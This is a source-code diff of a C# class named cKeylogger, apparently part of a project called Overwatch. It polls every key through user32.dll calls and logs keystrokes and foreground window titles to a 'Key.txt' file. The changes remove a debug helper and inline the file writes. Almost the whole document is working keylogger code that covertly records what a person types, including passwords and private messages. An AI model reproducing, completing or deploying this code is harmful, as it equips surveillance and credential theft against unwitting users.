@@ -10,36 +10,23 @@ namespace Overwatch
     {
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
-
         [DllImport("user32.dll")]
         public static extern IntPtr GetForegroundWindow();
-
         [DllImport("user32.dll")]
         public static extern IntPtr GetWindowText(IntPtr hWnd, StringBuilder textOut, int count);
-
         [DllImport("user32.dll")]
         public static extern IntPtr GetKeyboardState(byte[] lpKeyState);
-
         [DllImport("user32.dll", SetLastError = true)]
         static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
-
         [DllImport("user32.dll", SetLastError = true)]
         static extern uint GetKeyboardLayout(uint idThread);
-
         [DllImport("user32.dll", SetLastError = true)]
-
         static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, uint dwhkl);
 
         private const int MAX_STRING_BUILDER = 256;
         private const bool DEBUG = true;
         private StreamWriter writer;
-        private int counter;
         string path;
-
-    public cKeylogger()
-        {
-            counter = 0;
-        }
         internal void start()
         {
             path = appConfing.targetDirPath+"\\Key.txt";
@@ -57,7 +44,7 @@ namespace Overwatch
                         if (lastWindowText != tempWindowText)
                         {
                             lastWindowText = tempWindowText;
-                            write("BEGIN WINDOW: " + lastWindowText + "\n");
+                            writer.Write("BEGIN WINDOW: " + lastWindowText + "\n");
                         }
                         int value = GetAsyncKeyState(i);
                         if ((value & 0x8000) == 0 || (value & 0x1) == 0)
@@ -74,30 +61,29 @@ namespace Overwatch
                             case Keys.LShiftKey:
                             case Keys.RShiftKey:
                             case Keys.Capital:
-                                write(" [" + key.ToString() + "] ");
+                                writer.Write(" [" + key.ToString() + "] ");
                                 break;
                             case Keys.Enter:
-                                write("\n");
+                                writer.Write("\n");
                                 break;
                             case Keys.Space:
-                                write(" ");
+                                writer.Write(" ");
                                 break;
                             case Keys.Tab:
-                                write("\t");
+                                writer.Write("\t");
                                 break;
                             case Keys.Escape:
-                                if (DEBUG)
-                                    return;
+                                writer.Write(" ");
+                                break;
                             default:
                                 IntPtr hWindowHandle = GetForegroundWindow();
-                                uint dwProcessId;
-                                uint dwThreadId = GetWindowThreadProcessId(hWindowHandle, out dwProcessId);
+                                uint dwThreadId = GetWindowThreadProcessId(hWindowHandle, out uint dwProcessId);
                                 byte[] kState = new byte[256];
                                 GetKeyboardState(kState); //retrieves the status of all virtual keys
                                 uint HKL = GetKeyboardLayout(dwThreadId); //retrieves the input locale identifier
                                 StringBuilder keyName = new StringBuilder();
                                 ToUnicodeEx((uint)i, (uint)i, kState, keyName, 16, 0, HKL);
-                                write(keyName.ToString());
+                                writer.Write(keyName.ToString());
                                 break;
                         }
 
@@ -114,19 +100,6 @@ namespace Overwatch
             StringBuilder title = new StringBuilder(MAX_STRING_BUILDER);
             GetWindowText(handle, title, MAX_STRING_BUILDER); //return value > 0 if success
             return title.ToString();
-        }
-
-        private void write(string s)
-        {
-            writer.Write(s);
-            if (DEBUG)
-                Console.Write(s);
-            if (counter >= 1000)
-            {
-                writer.Close();
-                writer = new StreamWriter(path, true);
-                counter = 0;
-            }
         }
     }
 }
